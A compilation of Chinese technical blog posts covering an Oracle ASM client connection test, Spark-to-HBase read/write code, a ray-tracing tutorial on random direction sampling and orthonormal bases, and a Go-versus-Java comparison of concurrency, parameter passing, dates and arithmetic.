      (SERVER = DEDICATED)
      (SERVICE_NAME = +ASM)
      (INSTANCE_NAME = +ASM2)
    )
  )
因为是12c版本，无需配置UR=A，关于UR=A可参考之前的测试：

关于UR=A的测试

3.客户端测试连接
客户端测试连接ASM12c1:
[oracle@db01 admin]$ sqlplus infa/infa@asm12c1 as sysasm

SQL*Plus: Release 11.2.0.4.0 Production on Wed Mar 13 22:45:53 2019

Copyright (c) 1982, 2013, Oracle.  All rights reserved.


Connected to:
Oracle Database 12c Enterprise Edition Release 12.2.0.1.0 - 64bit Production

SQL> show parameter instance_name

NAME                                 TYPE
------------------------------------ ----------------------
VALUE
------------------------------
instance_name                        string
+ASM1
SQL> exit
Disconnected from Oracle Database 12c Enterprise Edition Release 12.2.0.1.0 - 64bit Production
客户端测试连接ASM12c2:
[oracle@db01 admin]$ sqlplus infa/infa@asm12c2 as sysasm

SQL*Plus: Release 11.2.0.4.0 Production on Wed Mar 13 22:46:19 2019

Copyright (c) 1982, 2013, Oracle.  All rights reserved.


Connected to:
Oracle Database 12c Enterprise Edition Release 12.2.0.1.0 - 64bit Production

SQL> show parameter instance_name

NAME                                 TYPE
------------------------------------ ----------------------
VALUE
------------------------------
instance_name                        string
+ASM2
SQL> 
我测试是没有任何问题的，明天连接实际客户环境再进一步看具体情况。

********************************************************************************************************************************************************************************************************
HBase连接的几种方式（二）
1. HBase连接的方式概况
主要分为：

纯Java API连接HBase的方式；
Spark连接HBase的方式；
Flink连接HBase的方式；
HBase通过Phoenix连接的方式；

第一种方式是HBase自身提供的比较原始的高效操作方式，而第二、第三则分别是Spark、Flink集成HBase的方式，最后一种是第三方插件Phoenix集成的JDBC方式，Phoenix集成的JDBC操作方式也能在Spark、Flink中调用。
注意：
这里我们使用HBase2.1.2版本，以下代码都是基于该版本开发的。
2. Spark上连接HBase
 Spark上读写HBase主要分为新旧两种API，另外还有批量插入HBase的，通过Phoenix操作HBase的。
2.1 spark读写HBase的新旧API
2.1.1 spark写数据到HBase
使用旧版本saveAsHadoopDataset保存数据到HBase上。

/**
 * saveAsHadoopDataset
 */
def writeToHBase(): Unit ={
  // 屏蔽不必要的日志显示在终端上
  Logger.getLogger("org.apache.spark").setLevel(Level.WARN)

  /* spark2.0以前的写法
  val conf = new SparkConf().setAppName("SparkToHBase").setMaster("local")
  val sc = new SparkContext(conf)
  */
  val sparkSession = SparkSession.builder().appName("SparkToHBase").master("local[4]").getOrCreate()
  val sc = sparkSession.sparkContext

  val tableName = "test"

  //创建HBase配置
  val hbaseConf = HBaseConfiguration.create()
  hbaseConf.set(HConstants.ZOOKEEPER_QUORUM, "192.168.187.201") //设置zookeeper集群，也可以通过将hbase-site.xml导入classpath，但是建议在程序里这样设置
  hbaseConf.set(HConstants.ZOOKEEPER_CLIENT_PORT, "2181") //设置zookeeper连接端口，默认2181
  hbaseConf.set(TableOutputFormat.OUTPUT_TABLE, tableName)

  //初始化job，设置输出格式，TableOutputFormat 是 org.apache.hadoop.hbase.mapred 包下的
  val jobConf = new JobConf(hbaseConf)
  jobConf.setOutputFormat(classOf[TableOutputFormat])

  val dataRDD = sc.makeRDD(Array("12,jack,16", "11,Lucy,15", "15,mike,17", "13,Lily,14"))

  val data = dataRDD.map{ item =>
      val Array(key, name, age) = item.split(",")
      val rowKey = key.reverse
      val put = new Put(Bytes.toBytes(rowKey))
      /*一个Put对象就是一行记录，在构造方法中指定主键
       * 所有插入的数据 须用 org.apache.hadoop.hbase.util.Bytes.toBytes 转换
       * Put.addColumn 方法接收三个参数：列族，列名，数据*/
      put.addColumn(Bytes.toBytes("cf1"), Bytes.toBytes("name"), Bytes.toBytes(name))
      put.addColumn(Bytes.toBytes("cf1"), Bytes.toBytes("age"), Bytes.toBytes(age))
      (new ImmutableBytesWritable(), put)
  }
  //保存到HBase表
  data.saveAsHadoopDataset(jobConf)
  sparkSession.stop()
}

 使用新版本saveAsNewAPIHadoopDataset保存数据到HBase上
a.txt文件内容为：

100,hello,20
101,nice,24
102,beautiful,26


/**
 * saveAsNewAPIHadoopDataset
 */
 def writeToHBaseNewAPI(): Unit ={
   // 屏蔽不必要的日志显示在终端上
   Logger.getLogger("org.apache.spark").setLevel(Level.WARN)
   val sparkSession = SparkSession.builder().appName("SparkToHBase").master("local[4]").getOrCreate()
   val sc = sparkSession.sparkContext

   val tableName = "test"
   val hbaseConf = HBaseConfiguration.create()
   hbaseConf.set(HConstants.ZOOKEEPER_QUORUM, "192.168.187.201")
   hbaseConf.set(HConstants.ZOOKEEPER_CLIENT_PORT, "2181")
   hbaseConf.set(org.apache.hadoop.hbase.mapreduce.TableOutputFormat.OUTPUT_TABLE, tableName)

   val jobConf = new JobConf(hbaseConf)
   //设置job的输出格式
   val job = Job.getInstance(jobConf)
   job.setOutputKeyClass(classOf[ImmutableBytesWritable])
   job.setOutputValueClass(classOf[Result])
   job.setOutputFormatClass(classOf[org.apache.hadoop.hbase.mapreduce.TableOutputFormat[ImmutableBytesWritable]])

   val input = sc.textFile("v2120/a.txt")

   val data = input.map{item =>
   val Array(key, name, age) = item.split(",")
   val rowKey = key.reverse
   val put = new Put(Bytes.toBytes(rowKey))
   put.addColumn(Bytes.toBytes("cf1"), Bytes.toBytes("name"), Bytes.toBytes(name))
   put.addColumn(Bytes.toBytes("cf1"), Bytes.toBytes("age"), Bytes.toBytes(age))
   (new ImmutableBytesWritable, put)
   }
   //保存到HBase表
   data.saveAsNewAPIHadoopDataset(job.getConfiguration)
   sparkSession.stop()
}

2.1.2 spark从HBase读取数据
使用newAPIHadoopRDD从hbase中读取数据，可以通过scan过滤数据

/**
 * scan
 */
 def readFromHBaseWithHBaseNewAPIScan(): Unit ={
   //屏蔽不必要的日志显示在终端上
   Logger.getLogger("org.apache.spark").setLevel(Level.WARN)
   val sparkSession = SparkSession.builder().appName("SparkToHBase").master("local").getOrCreate()
   val sc = sparkSession.sparkContext

   val tableName = "test"
   val hbaseConf = HBaseConfiguration.create()
   hbaseConf.set(HConstants.ZOOKEEPER_QUORUM, "192.168.187.201")
   hbaseConf.set(HConstants.ZOOKEEPER_CLIENT_PORT, "2181")
   hbaseConf.set(org.apache.hadoop.hbase.mapreduce.TableInputFormat.INPUT_TABLE, tableName)

   val scan = new Scan()
   scan.addFamily(Bytes.toBytes("cf1"))
   val proto = ProtobufUtil.toScan(scan)
   val scanToString = new String(Base64.getEncoder.encode(proto.toByteArray))
   hbaseConf.set(org.apache.hadoop.hbase.mapreduce.TableInputFormat.SCAN, scanToString)

   //读取数据并转化成rdd TableInputFormat是org.apache.hadoop.hbase.mapreduce包下的
   val hbaseRDD = sc.newAPIHadoopRDD(hbaseConf, classOf[org.apache.hadoop.hbase.mapreduce.TableInputFormat], classOf[ImmutableBytesWritable], classOf[Result])

   val dataRDD = hbaseRDD
     .map(x => x._2)
     .map{result =>
       (result.getRow, result.getValue(Bytes.toBytes("cf1"), Bytes.toBytes("name")), result.getValue(Bytes.toBytes("cf1"), Bytes.toBytes("age")))
     }.map(row => (new String(row._1), new String(row._2), new String(row._3)))
     .collect()
     .foreach(r => (println("rowKey:"+r._1 + ", name:" + r._2 + ", age:" + r._3)))
}

2.2 spark利用BulkLoad往HBase批量插入数据
BulkLoad原理是先利用mapreduce在hdfs上生成相应的HFlie文件，然后再把HFile文件导入到HBase中，以此来达到高效批量插入数据。

/**
 * 批量插入 多列
 */
 def insertWithBulkLoadWithMulti(): Unit ={

   val sparkSession = SparkSession.builder().appName("insertWithBulkLoad").master("local[4]").getOrCreate()
   val sc = sparkSession.sparkContext

   val tableName = "test"
   val hbaseConf = HBaseConfiguration.create()
   hbaseConf.set(HConstants.ZOOKEEPER_QUORUM, "192.168.187.201")
   hbaseConf.set(HConstants.ZOOKEEPER_CLIENT_PORT, "2181")
   hbaseConf.set(TableOutputFormat.OUTPUT_TABLE, tableName)

   val conn = ConnectionFactory.createConnection(hbaseConf)
   val admin = conn.getAdmin
   val table = conn.getTable(TableName.valueOf(tableName))

   val job = Job.getInstance(hbaseConf)
   //设置job的输出格式
   job.setMapOutputKeyClass(classOf[ImmutableBytesWritable])
   job.setMapOutputValueClass(classOf[KeyValue])
   job.setOutputFormatClass(classOf[HFileOutputFormat2])
   HFileOutputFormat2.configureIncrementalLoad(job, table, conn.getRegionLocator(TableName.valueOf(tableName)))

   val rdd = sc.textFile("v2120/a.txt")
     .map(_.split(","))
     .map(x => (DigestUtils.md5Hex(x(0)).substring(0, 3) + x(0), x(1), x(2)))
     .sortBy(_._1)
     .flatMap(x =>
       {
         val listBuffer = new ListBuffer[(ImmutableBytesWritable, KeyValue)]
         val kv1: KeyValue = new KeyValue(Bytes.toBytes(x._1), Bytes.toBytes("cf1"), Bytes.toBytes("name"), Bytes.toBytes(x._2 + ""))
         val kv2: KeyValue = new KeyValue(Bytes.toBytes(x._1), Bytes.toBytes("cf1"), Bytes.toBytes("age"), Bytes.toBytes(x._3 + ""))
         listBuffer.append((new ImmutableBytesWritable, kv2))
         listBuffer.append((new ImmutableBytesWritable, kv1))
         listBuffer
       }
     )
   //多列的排序，要按照列名字母表大小来
   
   isFileExist("hdfs://node1:9000/test", sc)

   rdd.saveAsNewAPIHadoopFile("hdfs://node1:9000/test", classOf[ImmutableBytesWritable], classOf[KeyValue], classOf[HFileOutputFormat2], job.getConfiguration)
   val bulkLoader = new LoadIncrementalHFiles(hbaseConf)
   bulkLoader.doBulkLoad(new Path("hdfs://node1:9000/test"), admin, table, conn.getRegionLocator(TableName.valueOf(tableName)))
}

/**
 * 判断hdfs上文件是否存在，存在则删除
 */
def isFileExist(filePath: String, sc: SparkContext): Unit ={
  val output = new Path(filePath)
  val hdfs = FileSystem.get(new URI(filePath), new Configuration)
  if (hdfs.exists(output)){
    hdfs.delete(output, true)
  }
}

2.3 spark利用Phoenix往HBase读写数据
利用Phoenix，就如同msyql等关系型数据库的写法，需要写jdbc

def readFromHBaseWithPhoenix: Unit ={
   //屏蔽不必要的日志显示在终端上
   Logger.getLogger("org.apache.spark").setLevel(Level.WARN)

   val sparkSession = SparkSession.builder().appName("SparkHBaseDataFrame").master("local[4]").getOrCreate()

   //表小写，需要加双引号，否则报错
   val dbTable = "\"test\""

   //spark 读取 phoenix 返回 DataFrame的第一种方式
   val rdf = sparkSession.read
     .format("jdbc")
     .option("driver", "org.apache.phoenix.jdbc.PhoenixDriver")
     .option("url", "jdbc:phoenix:192.168.187.201:2181")
     .option("dbtable", dbTable)
     .load()

   val rdfList = rdf.collect()
   for (i <- rdfList){
     println(i.getString(0) + " " + i.getString(1) + " " + i.getString(2))
   }
   rdf.printSchema()

   //spark 读取 phoenix 返回 DataFrame的第二种方式
   val df = sparkSession.read
     .format("org.apache.phoenix.spark")
     .options(Map("table" -> dbTable, "zkUrl" -> "192.168.187.201:2181"))
     .load()
   df.printSchema()
   val dfList = df.collect()
   for (i <- dfList){
      println(i.getString(0) + " " + i.getString(1) + " " + i.getString(2))
   }
   //spark DataFrame 写入 phoenix，需要先建好表
   /*df.write
     .format("org.apache.phoenix.spark")
     .mode(SaveMode.Overwrite)
     .options(Map("table" -> "PHOENIXTESTCOPY", "zkUrl" -> "jdbc:phoenix:192.168.187.201:2181"))
     .save()
*/
   sparkSession.stop()
}

3. 总结
github地址：
https://github.com/qiushangwenyue/HBaseDemo.git
参考资料：
https://my.oschina.net/uchihamadara/blog/2032481
https://www.cnblogs.com/simple-focus/p/6879971.html
https://www.cnblogs.com/MOBIN/p/5559575.html
https://blog.csdn.net/Suubyy/article/details/80892023
https://www.jianshu.com/p/b09283b14d84
https://www.jianshu.com/p/8e3fdf70dc06
https://www.cnblogs.com/wumingcong/p/6044038.html
https://blog.csdn.net/zhuyu_deng/article/details/43192271
https://www.jianshu.com/p/4c908e419b60
https://blog.csdn.net/Colton_Null/article/details/83387995
 


********************************************************************************************************************************************************************************************************
【RAY TRACING THE REST OF YOUR LIFE 超详解】 光线追踪 3-5 random direction & ONB
 
 Preface
往后看了几章，对这本书有了新的理解
上一篇，我们第一次尝试把MC积分运用到了Lambertian材质中，当然，第一次尝试是失败的，作者发现它的渲染效果和现实有些出入，所以结尾处声明要通过实践，改进当前的效果
于是乎，就有了后面的章节，几乎整本书都在讲，如何一步一步地改进上一篇的画质，使其更加符合现实，上一篇其实是抛砖引玉
这本书的小标题名为the rest of your life
通过前面几章，我们可以更好地理解这句话：我们通过MC积分优化效果，采用的是pdf函数，之前说过，这就是一场游戏：寻找一个pdf函数，使得使用它进行重要性采样得到的渲染图形更加贴合实际，其实它是没有止境的，比如pdf是一次曲线、二次曲线、高次曲线、正态分布、高斯分布等等，对应的研究方法也是没有止境的，比如：你可以通过对光源进行pdf采样实现最终目的（比如在双向追踪中，光源也要发射光线），你也可以通过对不同材质表面的反射状态进行pdf采样，进而使得表面颜色变化更光滑更柔和更贴合实际。
上述为个人理解，可能有些出入，吾姑妄言之，汝姑妄听之，便罢。
 
 Ready
上述说到抛砖引玉，但是好像我们用的不是一张图，思量再三，还是先把砖整一个，毕竟之后都是围绕那块砖评说效果的，另辟蹊径可能不是明智之举
所以，我们先把砖搞到手
造砖的代码：

void Cornell(intersections** scene, camera** cam, rtvar aspect)

{

      intersect ** list = new intersect*[8];

      size_t cnt = 0;

      material * red = new lambertian(new constant_texture(rtvec(0.65, 0.05, 0.05)));

      material * white = new lambertian(new constant_texture(rtvec(0.73, 0.73, 0.73)));

      material * green = new lambertian(new constant_texture(rtvec(0.12, 0.45, 0.15)));

      material * light = new areaLight(new constant_texture(rtvec(15, 15, 15)));

 

      list[cnt++] = new flip_normal(new yz_rect(0, 555, 0, 555, 555, green));

      list[cnt++] = new yz_rect(0, 555, 0, 555, 0, red);

      list[cnt++] = new xz_rect(213, 343, 227, 332, 554, light);

      list[cnt++] = new flip_normal(new xz_rect(0, 555, 0, 555, 555, white));

      list[cnt++] = new xz_rect(0, 555, 0, 555, 0, white);

      list[cnt++] = new flip_normal(new xy_rect(0, 555, 0, 555, 555, white));

      list[cnt++] = new translate(new rotate_y(new box(rtvec(), rtvec(165, 165, 165), white), -18), rtvec(130, 0, 65));

      list[cnt++] = new translate(new rotate_y(new box(rtvec(), rtvec(165, 330, 165), white), 15), rtvec(265, 0, 295));

      *scene =  new intersections(list, cnt);

      rtvec lookfrom(278, 278, -800);

      rtvec lookat(278, 278, 0);

      rtvar dist_to_focus = 10.0;

      rtvar aperture = 0.;

      rtvar vfov = 40.0;

      *cam = new camera(lookfrom, lookat, rtvec(0, 1, 0),

           vfov, 1, aperture, dist_to_focus, 0., 1.);

}

 
为了清晰点，sample改为了250，图片为200*200，为了方便重复做实验，所以参数就这样吧，能看清即可，"高清大图"实在是熬不起，都是夜啊，各位见谅~
上一篇结束之后的代码均不变，只是改一下Cornell 函数
我们得到

 
这就是上一篇最后得到的效果，没错
我们评说一下，这张图不仅没有减少噪点，而且高的长方体表面的颜色趋于均匀一致，与实际有偏差
评说好坏当然要有个参考，我们放上两张第二本书中得到的图形（未加入MC积分）
   
 
上面三张图，无论你看哪张图都能发现，正对我们的那个长方体表面是从上到下又黑到白渐变的，而且在正方体上表面高度处对应的长方体表面有一抹正方体上表面反射的白色光，而MC图形基本上呈均匀色调，甚至可能上面部分还稍白一些
 
所以我们进入今天的这一篇
 
 Content
今天我们讲两章，第一章是讲三维随机方向向量的生成，这有什么用呢，它给我们的三维空间内进行重要性采样用，MC需要它！！
Chapter5 Generating Random Direction
在这一章和后续的两章，我们需要加强我们的理解和我们手中的工具，搞明白什么才是正确的Cornell Box
让我们首先从如何生成随机方向开始说起。
为了方便，我们假定z轴为表面法线，之后再转换坐标系，与此同时，我们规定θ为从法线张开的角度
我们将仅仅处理关于z轴旋转对称的分布，所以其他相关的量，均设为均匀分布
 
给定一个和方向相关的pdf，p(direction) = f(θ)，一维pdf中θ 和 φ如下：
g(φ) = 1/(2π)　　　(均匀分布)
h(θ) = 2πf(θ)sinθ
 
对于两个随机生成的均匀变量r1和r2，我们在第三篇内容中推导出
r1 = ∫0->φ 1/(2π) dθ = φ/(2π)
得   φ = 2πr1
r2 =  ∫0->θ 2πf(t)sin(t) dt
t只是一个虚拟的量，用以代替变化的θ，然后辅助实现从0~θ对我们之前的被积函数f(θ)积分（变限积分量不能相同，所以引入t）
 
我们从下面开始尝试不同的f()
首先，我们考虑球体上采取均匀密度采样，因为整个球面为4πsr，故单位球体表面均匀密度采样的pdf函数为：p(direction) = 1/(4π)，所以得到：
r2 = ∫0->θ sin(t)/2 dt
 　= （-cos(t)/2）|0->θ
　 = （1-cosθ）/2
cosθ = 1 - 2r2
一般cosθ更常用一些，就不进一步求θ了，用的时候再acos()
为了在笛卡尔坐标系下生成一个指向（θ，φ）的单位向量，这就涉及到我们的球坐标代换方程了：
x = cosφ sinθ
y = sinφ sinθ
z = cosθ
它对应的球坐标如下

此处r为1
 
我们开始推导
把关于θ和φ的式子带入x,y,z中
x = cos(2πr1)*sqrt(1-cos2θ)
y = sin(2πr1)*sqrt(1-cos2θ)
z = 1-2r2
解得：
x = cos(2πr1)*sqrt(r2*(1-r2))
y = sin(2πr1)*sqrt(r2*(1-r2))
z = 1-2r2
 
然后我们来做个图，验证一下它是否如我们所愿，生成的点聚拢为单位球面
作者给出的画图方法是plot.ly，可以在线画，但是它要求注册账号，流程还挺麻烦的，GitHub授权账号老是没响应（可能我网不好），如果有兴趣的可以直接到这里
直接可以载入数据使用的网址
其实matlab最好使了，对不对啊
于是乎，我们先写入txt,千万不要写入xls，还是比较麻烦的
 

    stds ofstream outfile("random_direction.txt");

    for (int i = 0; i < 200; ++i)
    {
        double r1 = lvgm::rand01();
        double r2 = lvgm::rand01();
        double x = cos(2 * π * r1) * 2 * sqrt(r2 * (1 - r2));
        double y = sin(2 * π * r1) * 2 * sqrt(r2 * (1 - r2));
        double z = 1 - 2 * r2;
        outfile << x << "\t" << y << "\t" << z << stds endl;
    }
    
    outfile.close();

 
创建一个random_direction.xls的文件，点菜单栏中的数据->自文本，选择random_direction.txt，一路回车就加载完毕了，可见xls加载文本容易多了
假设你的路径是
E:\OpenGL\光线追踪\code\ray tracing 1-3\ray tracing 1-3\random_direction.xls
数据所在表的表名为sheet1
则matlab代码和效果如下图
 

 效果还是很好的
我们可以看到，它是均匀随机的，达到了我们的预期
 
呐，我们接下来试一下我们第二常用的pdf
即p(direction) = cosθ/π
r2 = ∫0->θ 2π（cos(t)/π）sint dt
   = (-cos2t)|0->θ
   = 1 - cos2θ
cosθ = sqrt(1-r2)
于是乎我们得到下述的x,y,z
x = cos(2πr1)*sqrt(r2)
y = sin(2πr1)*sqrt(r2)
z = sqrt(1-r2)
 
下面我们就生成随机向量

inline rtvec random_cosine_direction()
{
    double r1 = lvgm::rand01();
    double r2 = lvgm::rand01();
    double z = sqrt(1 - r2);
    double φ = 2 * π*r1;
    double x = cos(φ) * 2 * sqrt(r2);
    double y = sin(φ) * 2 * sqrt(r2);
    return rtvec(x, y, z);
}

 
我们按照原来的方法把第二个pdf函数产生的随机情况模拟一下：

 
 
那么我们用pdf做一个数值模拟
 

void estimate2()
{
    int n = 1000000;
    double sum = 0.;
    for (int i = 0; i < n; ++i)
    {
        rtvec v = ::random_cosine_direction();
        sum += pow(v.z(), 3) / (v.z() / π);
    }
    stds cout << "π/2 = " << π / 2 << stds endl;
    stds cout << "Estimate = " << sum / n << stds endl;
}

 
还有一个模拟半球得到的近似，pdf = 1/（2π）
有兴趣的可以自己推一下，这里直接给代码，为了和上面做对比

void estimate()
{
    int n = 1000000;
    double sum = 0.;
    for (int i = 0; i < n; ++i)
    {
        double r1 = lvgm::rand01();
        double r2 = lvgm::rand01();
        double x = cos(2 * π * r1) * 2 * sqrt(r2 * (1 - r2));
        double y = sin(2 * π * r1) * 2 * sqrt(r2 * (1 - r2));
        double z = 1 - r2;
        sum += z*z*z / (1. / (2.*π));
    }
    stds cout << "π/2 = " << π / 2 << stds endl;
    stds cout << "Estimate = " << sum / n << stds endl;
}

 
主函数

int main()
{
    //build_1_1();

    estimate();
    estimate2();
}

 
结果

可以看到模拟半球的pdf函数效果没有p() = cos/π 这个好
这一章中所有的都是基于z轴的，而下一章我们真正基于物体表面法线进行
 
Chapter6 Ortho-normal Bases
ONB是三个相互正交的单位向量集合，笛卡尔坐标系中的xyz轴也是一种ONB
我们这一章的目的就是把上一章基于z轴的随机方向转换到基于表面法线的
 
假设，我们有一个原点o和笛卡尔坐标系向量 x/y/z，当我们描述一个位置
比如：（3，-2,7）时，我们这样计算：
location = o + 3x - 2y +7z
假如有另外一个坐标系，它的原点为o'，基向量为 u/v/w
我们将要用如下方式表示（u，v，w）这个位置：
location = o' + uu + vv + ww
 
如果学过计算机图形学，那么你就可以用矩阵变换去完成坐标系，但是我们这里不需要这种操作。
我们需要的是生成具有相对于表面法线的集合分布的随机方向。 我们不需要原点，因为向量无起点。 
我们引用光线追踪1-8中所述的相机坐标来计算ONB的三个基向量

 
我们现在拥有的是法向量n，我们可以把它看做是lookfrom->lookat向量
我们需要一个vup,假设法向量n本身几乎平行于特定轴，那么vup就取和n垂直的基向量，反之，我们就使用特定轴作为vup
代码是描述思维最好的方式之一:(假设特定轴为x轴)
if(fabs(n.x())>0.9)　//单位法向量n的x分量大于0.9，认为n//x
　　vup = (0,1,0)
else
　　vup = (1,0,0)
 
我们设ONB基向量由 s,t,n 组成
那么 t = cross(vup,n).单位化
　　 s = cross(t,n)
理解可参考上图,t为图中的u, s为图中的v
 
所以我们的坐标系中的任一点（x,y,z）表示如下随机向量 = xs + yt + zn
 
至此，我们上代码：

/// onb.hpp
// 
// -----------------------------------------------------
// [author]        lv
// [begin ]        2019.3
// [brief ]        ONB
// -----------------------------------------------------

#pragma once

namespace rt
{

class onb
    {
public:

    onb() {  }

    inline const rtvec& operator[](int index)const { return axis[index]; }
        
    inline const rtvec& u()const { return axis[0]; }
        
    inline const rtvec& v()const { return axis[1]; }

    inline const rtvec& w()const { return axis[2]; }

public:

    inline rtvec local(double a, double b, double c)const;

    inline rtvec local(const rtvec& v)const;

    void build_from_w(const rtvec&);

private:
        
    rtvec axis[3];

    };



inline rtvec onb::local(double a, double b, double c)const
    {
    return a*u() + b*v() + c*w();
    }

inline rtvec onb::local(const rtvec& v)const
    {
    return local(v.x(), v.y(), v.z());
    }

inline void onb::build_from_w(const rtvec& V)
    {
    axis[2] = V.ret_unitization();
    rtvec a;
    if (fabs(w().x()) > 0.9)
        a = rtvec(0, 1, 0);
    else
        a = rtvec(1, 0, 0);
    axis[1] = lvgm::cross(w(), a).ret_unitization();
    axis[0] = lvgm::cross(w(), v());
    }

} // rt namespace

 
我们的Lambertian材质的scatter函数需要做相应的改动
原书没有do-while循环，但是可能会出现pdf为零的除零错误，所以我们生成的随机方向必须能够算出一个非零的pdf，这并不妨碍我们的算法，因为这一切都是随机的，随机错误就再随机一次

bool lambertian::scatter(const ray& rIn, const hitInfo& info, rtvec& alb, ray& scattered, rtvar& pdf)const
    {
    onb uvw;
    uvw.build_from_w(info._n);
    do {
        rtvec direction = uvw.local(random_cosine_direction());
        scattered = ray(info._p, direction.ret_unitization(), rIn.time());
        pdf = dot(uvw.w(), scattered.direction()) / π;
    } while (pdf == rtvar(0));
    alb = _albedo->value(info._u, info._v, info._p);
    return true;
    }

 
然后我们跑一遍场景

感觉还不是很真实，好像和以前的差不多（正常，这不能算鸽~，因为第八章以后差不多才可以。。）
探索过程也是很值得借鉴的嘛，毕竟这是在一步一步引入新的技术，算是循循善诱~
下面是原书结尾，下一篇我们讲牛逼的技术——直接光源采样

 
感谢您的阅读，生活愉快~
********************************************************************************************************************************************************************************************************
20190312_浅谈go&java差异(一)
多线程

java

java中对于大量的比较耗时的任务多采用多线程对方式对任务进行处理，同时由于进程和线程
本身是通过宿主机OS进行管理的，当在cpu核数较少或线程分配不当 会导致多线程的效果不佳的事常有发生
代码片段：
    //处理器核心数
    int processor = Runtime.getRuntime().availableProcessors();
    //XSSFWorkbook 一次只能写入六万多条数据，所以这里最好使用SXSSFWorkbook
    SXSSFWorkbook workBook = new SXSSFWorkbook();
    //创建格式
    CellStyle style = workBook.createCellStyle();
    //居中格式
    style.setAlignment(HorizontalAlignment.CENTER);
    //手工创建线程池
    ExecutorService executorService = new ThreadPoolExecutor(processor, processor, 1000, TimeUnit.MILLISECONDS, new LinkedBlockingDeque(),
            new ThreadFactoryBuilder().setNameFormat("poi-task-%d").build());
    //计数器 等待线程池中的线程执行完毕
    CountDownLatch countDownLatch = new CountDownLatch(processor);
    for (int i = 0; i < processor; i++) {
        int sheetId = i;
        //放入线程池中
        executorService.execute(() -> createSheet(workBook, style,sheetId, countDownLatch));
    }
    try {
        //等待所有线程执行完毕
        countDownLatch.await();
        executorService.shutdown();
    } catch (InterruptedException e) {
        e.printStackTrace();
    }

go
由于进程和线程都是基于OS管理的，不可避免的产生开销；go区别与以上两者使用的是协程（goroutine），协程是线程的内的细颗粒化，
同时它是被go自己管理的所以开销相当的小，同时一个go应用可以轻松构建上百万个goroutine，不仅如此，go也提供了通道（channel）方便
对协程之间进行数据交互

代码片段：
import (
    "fmt"
    "sync"
)

func says(s string, gw *sync.WaitGroup) {
    for i := 0; i < 5; i++ {
        fmt.Println(">>> ", s)
    }
    gw.Done()
}
func main() {
    var gw sync.WaitGroup
    gw.Add(1)
    go says("Hello s", &gw)
    gw.Wait()
}
函数参数传递

java

java对于函数值对传递采取对是值传递的方式，对于基本数据类型：传递前后值所在栈的位置是不一致的（也就是被拷贝了一份）
对于非基本数据类型：虽然也会做拷贝，但实际上这前后的对象引用的是同一内存位置的值，这就造成了"引用传递的假象"
代码片段：
public class TransParams {

    public static void main(String[] args){
        Person p = new Person();
        p.setAge(99);
        p.setName("Lisa");

        System.out.println(p.getAge());
        System.out.println(p);
        System.out.println("======>split<=====");

        TransParams tp = new TransParams();
        tp.setValue(p);
        System.out.println(p.getAge());
        System.out.println(p);
    }

    public  void setValue(Person p){
        p.setAge(19);
    }
}
class Person {
    private Integer age;
    private String name;

    public Integer getAge() {
        return age;
    }

    public void setAge(Integer age) {
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}
运行结果:
   99
   com.task.charset.Person@7e0b37bc
   ======>split<=====
   19
   com.task.charset.Person@7e0b37bc

go
go语言的处理方式不同于java，具体分两个种：拷贝传递 和 指针传递
对于拷贝传递：不论是基本数据类型还是结构体类型，前后的值都不会是同一个
对于引用传递：传递前后都是同一个值对象，不会存在java的理解歧义
代码片段：

import "fmt"

func main() {
    var s1 []string
    fmt.Println("拷贝传递前>", s1)
    tr01(s1)
    fmt.Println("拷贝传递后>", s1)

    fmt.Println("=====><=====")

    var s2 []string
    fmt.Println("指针传递前>", s2)
    tr02(&s2)
    fmt.Println("指针传递后>", s2)
}

func tr01(m []string) {
    m = append(m, "youth01")
}

func tr02(mm *[]string) {
    *mm = append(*mm, "youth02")
}

输出结果：
拷贝传递前> []
拷贝传递后> []
=====><=====
指针传递前> []
指针传递后> [youth02]
日期格式处理

java

在java8之前jdk仅提供了Date类型的格式化，对应的日期处理类是SimpleDateFormat，
在java8至java8之后Oracle提供了LocalDate与LocalDateTime的两种日期格式，对应的日期处理类是DateTimeFormat
代码片段：
public class Format2LocalDate {
    private static final Logger LOG = LoggerFactory.getLogger(Format2LocalDate.class);

    private static final DateTimeFormatter DATE_FORMAT_SHORT = DateTimeFormatter.ofPattern("yyyyMMdd HH:mm:ss");

    @Test
    public void transDate(){
        this.parse();
        this.format();
        LOG.info(".....................");
        this.parseD();
        this.formatD();
    }
    public void parse(){
        String str = "20190116 12:12:22";
        Date today = Date.from(LocalDateTime.parse(str,DATE_FORMAT_SHORT).atZone(DateUtil.CHINA_ZONE_ID).toInstant());
        LOG.info("转换结果为> {}",today);
    }

    public void format(){
        LocalDateTime ldt = LocalDateTime.now();
        LOG.info("格式化字符串> {}",ldt.format(DATE_FORMAT_SHORT));

    }


    public final static String DATE_FORMAT = "yyyy-MM-dd HH:mm:ss";


    public void parseD(){
        String dateStr = "2019-01-01 12:22:33";
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(DATE_FORMAT);
        Date date = null;
        try {
             date =  simpleDateFormat.parse(dateStr);
        } catch (ParseException e) {
            e.printStackTrace();
        }
        LOG.info("转换结果为> {}",date);
    }

    public void formatD(){
        Date date = new Date();
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(DATE_FORMAT);

        LOG.info("格式化结果为> {}",simpleDateFormat.format(date));

    }
}

输出结果为：
转换结果为> Wed Jan 16 12:12:22 CST 2019
格式化字符串> 20190313 21:20:23
.....................
转换结果为> Tue Jan 01 12:22:33 CST 2019
格式化结果为> 2019-03-13 21:20:23

go
go的日期处理相对于java来说十分的怪异，官方给出的例子是个固定的日期字符串，并非"yyyymmdd"这种形式，这里就不用说了
看代码
代码片段：

/**
  官方定义的不可更改
*/
const DATE_FORMAT string = "2006-01-02 15:04:05"

func main() {
    parse()
    format()
}

func parse() {
    tm := time.Now()
    strs := tm.Format(DATE_FORMAT)
    fmt.Println("日期转换为字符串> ", strs)
}
func format() {
    tm, _ := time.Parse(DATE_FORMAT, "2019-01-01 12:12:12")
    fmt.Println("字符串转换为日期> ", tm)
}
运行结果：
日期转换为字符串>  2019-03-13 21:29:30
字符串转换为日期>  2019-01-01 12:12:12 +0000 UTC
数学运算

java
java的数学基本运算往往会有精度丢失问题，所以对于敏感运算建议使用BigDecimal
代码片段：

//加减乘除都出现了对应的精度问题
public class MathCalcul {
    private static final Logger LOG = LoggerFactory.getLogger(MathCalcul.class);

    @Test
    public void calcul(){
        LOG.info("加： {}",0.1 + 0.2);
        LOG.info("减： {}",1.1 - 0.11);
        LOG.info("乘： {}",1.13 * 100);
        LOG.info("除： {}",100.13 / 100);
    }
}

